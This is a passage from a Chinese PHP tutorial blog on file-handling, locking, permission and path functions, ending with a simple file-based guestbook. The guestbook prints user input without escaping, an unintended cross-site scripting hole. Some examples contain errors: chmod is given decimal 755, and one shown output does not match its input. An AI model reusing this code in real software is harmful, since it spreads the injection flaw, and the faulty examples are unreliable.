<h4 id="6-3-文件指针操作函数"><a href="#6-3-文件指针操作函数" class="headerlink" title="6.3 文件指针操作函数"></a><font color="#3CB371" face="Comic sans MS">6.3 文件指针操作函数</font></h4><p><font color="#00B2EE"><strong>rewind ( resource handle)</strong></font></p>
<blockquote>
<p><strong>功能：指针回到开始处</strong></p>
</blockquote>
<p><font color="#00B2EE"><strong>fseek ( resource handle, int offset [, int from_where])</strong></font></p>
<blockquote>
<p><strong>功能：文件指针向后移动指定字符</strong></p>
</blockquote>
<p><strong>注意：</strong>我们在之前的读取当中我们发现fread读取指定长度的数据。读取指定长度的内容，下次再读取的时候<strong>从原位置开始再接着向后读取</strong>。</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_fseek.asp">PHP fseek() 函数</a>]</font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">必需。规定要在其中定位的文件。</td>
</tr>
<tr>
<td align="center">offset</td>
<td align="left">必需。<strong>规定新的位置</strong>（从文件头开始以字节数度量）。</td>
</tr>
<tr>
<td align="center">whence</td>
<td align="left">可选。<br>可能的值：<br>SEEK_SET - 设定位置等于 offset 字节。默认。<br>SEEK_CUR - 设定位置为当前位置加上 offset。<br>SEEK_END - 设定位置为文件末尾加上 offset （要移动到文件尾之前的位置，offset 必须是一个<br>负值）。</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="6-4-filesize-检测文件的大小"><a href="#6-4-filesize-检测文件的大小" class="headerlink" title="6.4 filesize 检测文件的大小"></a><font color="#3CB371" face="Comic sans MS">6.4 filesize 检测文件的大小</font></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span> . <span class="string">&#x27;文件大小为: &#x27;</span> . filesize(<span class="variable">$filename</span>) . <span class="string">&#x27; bytes&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>还有一些其他操作文件的函数，读取文件：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">file</td>
<td align="left">把整个文件读入一个数组中</td>
</tr>
<tr>
<td align="center">fgets</td>
<td align="left">从文件指针中读取一行,读到最后返回false</td>
</tr>
<tr>
<td align="center">fgetc</td>
<td align="left">从文件指针中读取一个字符，读到最后返回false</td>
</tr>
<tr>
<td align="center">ftruncate</td>
<td align="left">将文件截断到给定的长度</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="6-5-文件的时间函数"><a href="#6-5-文件的时间函数" class="headerlink" title="6.5 文件的时间函数"></a><font color="#3CB371" face="Comic sans MS">6.5 文件的时间函数</font></h4><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">filectime</td>
<td align="left">文件创建时间</td>
</tr>
<tr>
<td align="center">filemtime</td>
<td align="left">文件修改时间</td>
</tr>
<tr>
<td align="center">fileatime</td>
<td align="left">文件上次访问时间</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;demo.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的上次访问时间是:&#x27;</span>  . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, fileatime(<span class="variable">$filename</span>));</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的创建时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filectime(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$filename文件的修改时间是: &#x27;</span> . date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, filemtime(<span class="variable">$filename</span>));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">```			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line"><span class="comment">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;七. 文件锁处理机制&lt;/font&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;**文件锁的用途：**</span><br><span class="line">若一个人在写入一个文件，另外一个人同时也打个了这个文件进行写入文件。</span><br><span class="line">这情况下，如果遇到一定的碰撞概率的话，不知道到底谁的操作为准。</span><br><span class="line">因此，这个时候我们引入锁机制。</span><br><span class="line">若用户A在写入或者读取这个文件的时候，将文件加上共享所。我可以读，其他人也可以读。</span><br><span class="line">但是，我如果这与的时候。我使用独占锁。这个文件归我了，你们都别动，除非我将文件锁进行释放。</span><br><span class="line"></span><br><span class="line">&lt;font color=<span class="string">&quot;#FF7F00&quot;</span>&gt;**注意：不论加上了文件锁后要注意释放。**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">**<span class="keyword">bool</span>** &lt;font color=<span class="string">&quot;#00B2EE&quot;</span>&gt;**flock(file,lock,block)**&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">参数	|描述|</span><br><span class="line">:-:|:-|	</span><br><span class="line">file	|必需。规定要锁定或释放的已打开的文件。</span><br><span class="line">lock	|必需。规定要使用哪种锁定类型。&lt;br&gt;lock 参数可以是以下值之一：&lt;br&gt;要取得共享锁定（读取的程序），将 lock 设为 LOCK_SH（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本设置为 <span class="number">1</span>）&lt;br&gt;要取得独占锁定（写入的程序），将 lock 设为 LOCK_EX（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">2</span>）&lt;br&gt;要释放锁定（无论共享或独占），将 lock 设为 LOCK_UN（PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">3</span>）&lt;br&gt;如果不希望 flock() 在锁定时堵塞，则给 lock 加上 LOCK_NB(PHP <span class="number">4.0</span>.<span class="number">1</span> 以前的版本中设置为 <span class="number">4</span>)</span><br><span class="line">block	|可选。若设置为 <span class="number">1</span> 或 <span class="literal">true</span>，则当进行锁定时阻挡其他进程。</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = fopen(<span class="string">&quot;demo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行排它型锁定</span></span><br><span class="line"><span class="keyword">if</span> (flock(<span class="variable">$fp</span>, LOCK_EX)) &#123; </span><br><span class="line"></span><br><span class="line">   fwrite(<span class="variable">$fp</span>, <span class="string">&quot;文件这个时候被我独占了哟\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 释放锁定</span></span><br><span class="line">   flock(<span class="variable">$fp</span>, LOCK_UN);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;锁失败，可能有人在操作，这个时候不能将文件上锁&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong></p>
</blockquote>
<ol>
<li>上例中我为了写入文件，把文件加上了独占锁。</li>
<li>如果我操作完成，写入完成后，解除掉了独占锁。</li>
</ol>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="八-目录-文件夹-处理函数"><a href="#八-目录-文件夹-处理函数" class="headerlink" title="八. 目录(文件夹)处理函数"></a><font color="#FF6347" face="Comic sans MS">八. 目录(文件夹)处理函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>处理文件夹的基本思想如下：</strong></font></p>
</blockquote>
<ol>
<li>读取某个路径的时候判断是否是文件夹</li>
<li>是文件夹的话，打开指定文件夹，返回文件目录的资源变量</li>
<li>使用readdir读取一次目录中的文件，目录指针向后偏移一次</li>
<li>使用readdir读取到最后，没有可读的文件返回false</li>
<li>关闭文件目录</li>
</ol>
<p>&amp;emsp;<br>常用函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">opendir()</td>
<td align="left">打开文件夹，返回操作资源 &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_opendir.asp">PHP opendir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">readdir()</td>
<td align="left">读取文件夹资源,返回目录中下一个文件的文件名。 &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_readdir.asp">PHP readdir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">is_dir()</td>
<td align="left">判断是否是文件夹  &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_is_dir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">closedir()</td>
<td align="left">关闭文件夹操作资源  &amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_directory_closedir.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">filetype()</td>
<td align="left">显示是文件夹还是文件，文件显示file，文件夹显示dir <br>可能的类型：（fifo、char、dir、block、link、file、unknown）&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_filetype.asp">PHP is_dir() 函数</a>]</font></td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="九-文件权限设置"><a href="#九-文件权限设置" class="headerlink" title="九. 文件权限设置"></a><font color="#FF6347" face="Comic sans MS">九. 文件权限设置</font></h3><ol>
<li><p><strong>文件权限设置的函数</strong>在系统管理级别的软件中很常用。<br>例如：某个文件不准许guest组（来宾用户）查看。</p>
</li>
<li><p>在企业管理中，某些用户或者某些用户文件只准读取不准修改。这都是非常常用的功能。</p>
</li>
<li><p>注：windows下面有些功能无法实现。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">chmod</td>
<td align="left">修改读取模式</td>
</tr>
<tr>
<td align="center">chgrp</td>
<td align="left">修改用户组</td>
</tr>
<tr>
<td align="center">chown</td>
<td align="left">修改权限</td>
</tr>
</tbody></table>
<blockquote>
<p>上面的函数用法与linux的权限操作的用法一样。</p>
</blockquote>
<p>&amp;emsp;<br>chmod 主要是修改文件的的权限</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//修改linux  系统/var/wwwroot/某文件权限为755</span></span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="number">755</span>);  </span><br><span class="line">chmod(<span class="string">&quot;/var/wwwroot/index.html&quot;</span>, <span class="string">&quot;u+rwx,go+rx&quot;</span>); </span><br><span class="line">chmod(<span class="string">&quot;/somedir/somefile&quot;</span>, <span class="number">0755</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="十-文件路径函数"><a href="#十-文件路径函数" class="headerlink" title="十. 文件路径函数"></a><font color="#FF6347" face="Comic sans MS">十. 文件路径函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>我们经常会遇到处理文件路径的情况。</strong></font></p>
</blockquote>
<ol>
<li>文件后缀需要取出来</li>
<li>路径需要取出名字不取目录</li>
<li>只需要取出路径名中的目录路径</li>
<li>或者把网址中的各个部份进行解析取得独立值</li>
<li>甚至是自己组成一个url出来<br>……</li>
</ol>
<p>&amp;emsp;<br>常用路径处理函数：</p>
<table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">pathinfo()</td>
<td align="left">返回文件的各个组成部份</td>
</tr>
<tr>
<td align="center">basename()</td>
<td align="left">返回文件名</td>
</tr>
<tr>
<td align="center">dirname()</td>
<td align="left">文件目录部份</td>
</tr>
<tr>
<td align="center">parse_url()</td>
<td align="left">网址拆解成各部份</td>
</tr>
<tr>
<td align="center">http_build_query()</td>
<td align="left">生成url 中的query字符串</td>
</tr>
<tr>
<td align="center">http_build_url()</td>
<td align="left">生成一个url</td>
</tr>
</tbody></table>
<p>&amp;emsp;</p>
<h4 id="10-1-pathinfo-函数"><a href="#10-1-pathinfo-函数" class="headerlink" title="10.1 pathinfo()函数"></a><font color="#3CB371" face="Comic sans MS">10.1 pathinfo()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：以关联数组的形式返回文件路径的信息</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>pathinfo(path,options)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_pathinfo.asp">PHP pathinfo() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">process_sections</td>
<td align="left">可选。规定要返回的数组元素。默认是 all。<br>可能的值：<br>PATHINFO_DIRNAME - 只返回 dirname<br>PATHINFO_BASENAME - 只返回 basename<br>PATHINFO_EXTENSION - 只返回 extension</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path_parts</span> = pathinfo(<span class="string">&#x27;d:/www/index.inc.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件目录名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;dirname&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件全名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;basename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;文件扩展名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;extension&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不包含扩展的文件名：&#x27;</span>.<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">文件目录名：d:/www</span><br><span class="line">文件全名：lib.inc.php</span><br><span class="line">文件扩展名：php</span><br><span class="line">不包含扩展的文件名：lib.inc</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-2-basename-函数"><a href="#10-2-basename-函数" class="headerlink" title="10.2 basename()函数"></a><font color="#3CB371" face="Comic sans MS">10.2 basename()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回路径中不带有文件扩展名的文件名</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>basename(path[,suffix])</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_basename.asp">PHP basename() 函数</a>]</font></td>
</tr>
<tr>
<td align="center">suffix</td>
<td align="left">可选。指定文件名到了指定字符停止。</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1: &quot;</span>.basename(<span class="string">&quot;d:/www/index.d&quot;</span>, <span class="string">&quot;.d&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;2: &quot;</span>.basename(<span class="string">&quot;d:/www/index.php&quot;</span>).PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;3: &quot;</span>.basename(<span class="string">&quot;d:/www/passwd&quot;</span>).PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line"><span class="number">1</span>: index</span><br><span class="line"><span class="number">2</span>: index.php</span><br><span class="line"><span class="number">3</span>: passwd</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-3-dirname-函数"><a href="#10-3-dirname-函数" class="headerlink" title="10.3 dirname()函数"></a><font color="#3CB371" face="Comic sans MS">10.3 dirname()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：返回文件路径的文件目录部份,不包含文件名。</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>dirname(path)</strong></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">path</td>
<td align="left">必需。规定要检查的路径。&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_filesystem_dirname.asp">PHP dirname() 函数</a>]</font></td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> dirname(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">执行结果如下</span><br><span class="line">G:\WAMP\www</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;</p>
<h4 id="10-4-parse-url-函数"><a href="#10-4-parse-url-函数" class="headerlink" title="10.4 parse_url()函数"></a><font color="#3CB371" face="Comic sans MS">10.4 parse_url()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：将网址拆解成各个部份，返回一个数组</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>mixed parse_url ( string $路径 )</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url(<span class="variable">$url</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"><span class="keyword">array</span>(<span class="number">8</span>) &#123;</span><br><span class="line">[<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span></span><br><span class="line">[<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;hostname&quot;</span></span><br><span class="line">[<span class="string">&quot;port&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">9090</span>)</span><br><span class="line">[<span class="string">&quot;user&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;username&quot;</span></span><br><span class="line">[<span class="string">&quot;pass&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;password&quot;</span></span><br><span class="line">[<span class="string">&quot;path&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;/path&quot;</span></span><br><span class="line">[<span class="string">&quot;query&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;arg=value&quot;</span></span><br><span class="line">[<span class="string">&quot;fragment&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;anchor&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;</p>
<h4 id="10-5-http-build-query-函数"><a href="#10-5-http-build-query-函数" class="headerlink" title="10.5 http_build_query()函数"></a><font color="#3CB371" face="Comic sans MS">10.5 http_build_query()函数</font></h4><blockquote>
<p><font color="#FF7F00"><strong>功能：生成url 中的query字符串</strong></font></p>
</blockquote>
<p><font color="#00B2EE"><strong>string http_build_query ( mixed $需要处理的数据)</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个关联数组</span></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">       <span class="string">&#x27;username&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;area&#x27;</span>=&gt;<span class="string">&#x27;hubei&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成query内容</span></span><br><span class="line"><span class="keyword">echo</span> http_build_query(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line">username=php&amp;area=hubei</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注：</strong>PHP_EOL 常量<br>在 windows平台相当于 echo “\r\n”;<br>在unix\linux平台相当于 echo “\n”;<br>在mac平台相当于 echo “\r”;</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="十一-文件系统实例案例"><a href="#十一-文件系统实例案例" class="headerlink" title="十一. 文件系统实例案例"></a><font color="#FF6347" face="Comic sans MS">十一. 文件系统实例案例</font></h3><h4 id="11-1-文件留言本"><a href="#11-1-文件留言本" class="headerlink" title="11.1 文件留言本"></a><font color="#3CB371" face="Comic sans MS">11.1 文件留言本</font></h4><p>先来说两个下面用到的两个字符串函数和一个数组函数：</p>
<p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_trim.asp"><strong>trim()函数</strong></a>]</font>：<strong>移除字符串两侧的空白字符或其他预定义字符。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp"><strong>explode()函数</strong></a>]</font><strong>：把字符串打散为数组。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp"><strong>each()函数</strong></a>]</font><strong>：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。</strong></p>
<p><font color="#FF7F00"></font></p>
<p>&amp;emsp;<br><font color="#00B2EE">[<a href="http://www.php.cn/code/4934.html"><strong>视频教程</strong></a>]</font></p>
<blockquote>
<p><font color="#FF7F00"><strong>1. 文件结构：</strong></font><br>index.php —展示输入框和留言内容,并将内容提交到write.php；<br>write.php —接收并处理来自index.php的内容，然后向message.txt写入数据；<br>message.txt —接收并存入来自write.php的聊天内容。</p>
</blockquote>
<p>index.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line"><span class="comment">//设置时区</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;PRC&#x27;</span>);</span><br><span class="line"><span class="comment">//读了内容</span></span><br><span class="line">@<span class="variable">$string</span> = file_get_contents(<span class="string">&#x27;message.txt&#x27;</span>);</span><br><span class="line"><span class="comment">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="comment">//每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span></span><br><span class="line">    <span class="variable">$string</span> = rtrim(<span class="variable">$string</span>, <span class="string">&#x27;&amp;^&#x27;</span>);</span><br><span class="line">    <span class="comment">//以&amp;^切成数组</span></span><br><span class="line">    <span class="variable">$arr</span> = explode(<span class="string">&#x27;&amp;^&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="comment">//将留言内容读取</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="comment">//将用户名和内容分开</span></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$content</span>, <span class="variable">$time</span>) = explode(<span class="string">&#x27;$#&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;用户名为&lt;font color=&quot;gree&quot;&gt;&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;&lt;/font&gt;内容为&lt;font color=&quot;red&quot;&gt;&#x27;</span> . <span class="variable">$content</span> . <span class="string">&#x27;&lt;/font&gt;时间为&#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>, <span class="variable">$time</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;基于文件的留言本演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;write.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    用户名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">    留言内容：&lt;textarea  name=<span class="string">&quot;content&quot;</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>write.php文件：<br><font color="#FF7F00"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//追加方式打开文件</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;message.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置时间</span></span><br><span class="line"><span class="variable">$time</span>=time();</span><br><span class="line"></span><br><span class="line"><span class="comment">//得到用户名</span></span><br><span class="line"><span class="variable">$username</span>=trim(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="comment">//得到内容</span></span><br><span class="line"><span class="variable">$content</span>=trim(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//组合写入的字符串：内容和用户之间分开，使用$#</span></span><br><span class="line"><span class="comment">//行与行之间分开，使用&amp;^</span></span><br><span class="line"><span class="variable">$string</span>=<span class="variable">$username</span>.<span class="string">&#x27;$#&#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;$#&#x27;</span>.<span class="variable">$time</span>.<span class="string">&#x27;&amp;^&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关闭文件</span></span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location:index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font color="#00B2EE"><strong>步骤1：</strong></font><strong>在www目录下的index.php里面复制上面相对应的内容、新建一个write.php文件并复制相应的内容、新建一个message.txt空文件；</strong><br><font color="#00B2EE"><strong>步骤2：</strong></font><strong>运行index.php如下：</strong></p>
<p><img data-src="https://i.loli.net/2019/02/21/5c6e21be78910.png" alt="Hash函数.png"></p>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>步骤3：</strong></font><strong>向留言框输入文字并点击提交</strong></p>
<p>&amp;emsp;</p>
<h4 id="11-2-修改配置文件"><a href="#11-2-修改配置文件" class="headerlink" title="11.2 修改配置文件"></a><font color="#3CB371" face="Comic sans MS">11.2 修改配置文件</font></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/code/4935.html"><strong>视频教程</strong></a>]</font><br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP操作MySQL数据库</title>
    <url>/post/PHP-MySQL/</url>
    <content><![CDATA[<p>😁</p>
<span id="more"></span>
<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP操作MySQL数据库</font></center>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-数据库连接步骤"><a href="#一-数据库连接步骤" class="headerlink" title="一. 数据库连接步骤"></a><font color="#FF6347" face="Comic sans MS">一. 数据库连接步骤</font></h3><p>将数据库连接整理成了最重要的<font color="#FF7F00"><strong>8个步骤</strong></font>，我戏称它为：“数据库连接天龙八步”。😊  (。・∀・)ノ</p>
